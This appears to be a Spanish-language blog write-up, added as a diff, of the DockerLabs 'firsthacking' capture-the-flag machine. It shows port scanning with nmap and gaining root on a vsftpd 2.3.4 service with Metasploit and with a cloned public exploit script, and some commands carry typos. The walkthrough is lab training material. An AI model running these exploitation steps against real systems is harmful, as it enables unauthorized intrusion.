@@ -1,0 +1,72 @@
+<p><img src="assets/logo-dockerlabs.png" alt="logodocker" w="200" h="200" /></p>
+
+<p>En este reto de <a href="https://dockerlabs.es" title="dockerlabs">DockerLabs</a>  nos encontramos con una maquina sumamente facil con escaneo de puertos y explotacion a traves de exploit</p>
+
+<h2 id="herramientas-y-recursos-usados">Herramientas y recursos usados</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>searchsploit</li>
+  <li>msfconsole</li>
+  <li>python</li>
+</ul>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Empezamos lanzando un nmap contra el objetivo .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-vvv</span> 172.17.0.2 <span class="nt">-oX</span> firsthacking
+</code></pre></div></div>
+
+<p><a href="/reporte/firsthacking.html" title="reportesnmap">Reporte nmap</a></p>
+
+<p>Nmap nos indica que tenemos el 21 que coresponde al servicio ftp fijaos en la version, si solo tenemos ese acceso no hay otra que buscar por ese servicio y con esa version de software.</p>
+
+<p>Vamos al grano pq en mi opinion esta deberia ser muy facil o es la resaca de haber intentado hacer la hacktheheaven sin exito.
+Asi que sin mas ejecutamos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit vsftpd
+</code></pre></div></div>
+<p>Obtenemos lo que esperaba</p>
+
+<p><img src="assets/firsthacking/searchsploit.png" alt="searchsploit" /></p>
+
+<h2 id="explotacion">Explotacion</h2>
+
+<p>Con la info ya conseguida vamos a msfconsole y intducimos lo siguente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>search vsftp  
+use 1
+show options
+<span class="nb">set </span>RHOSTS <span class="nv">$ipvictima</span>
+run
+</code></pre></div></div>
+<p><img src="assets/firsthacking/msfprin.png" alt="msfprin" /></p>
+
+<p><img src="assets/firsthacking/endmsf.png" alt="endmsf" /></p>
+
+<p>Como veis en la segunda imagen somos root.</p>
+
+<h2 id="con-python">Con python</h2>
+
+<p><a href="https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git">exploit</a></p>
+
+<p>Este exploit necesita de la instalacion de pwntools creo un entrono virtual para no tener mierda por ahi .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> venv vsftpd2.4
+<span class="nb">source  </span>vsftpd2.4/bin/activate 
+pip3 <span class="nb">install </span>pwntools
+git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.github
+<span class="nb">cd  </span>vsftpd_2.3.4
+chomd +x exploit.py
+python3 exploit.py <span class="nv">$ipvictima</span>
+</code></pre></div></div>
+
+<p><img src="assets/firsthacking/clone.png" alt="clone" /></p>
+
+<p><img src="assets/firsthacking/rootexploit.png" alt="root" /></p>
+
+<p>Esta maquina es para aprender a usar google si la comparas con la que nombraba antes que es un infireno para el que esta aprendiendo.</p>
+
+<p>En fin hasta la proxima maquina.</p>
+
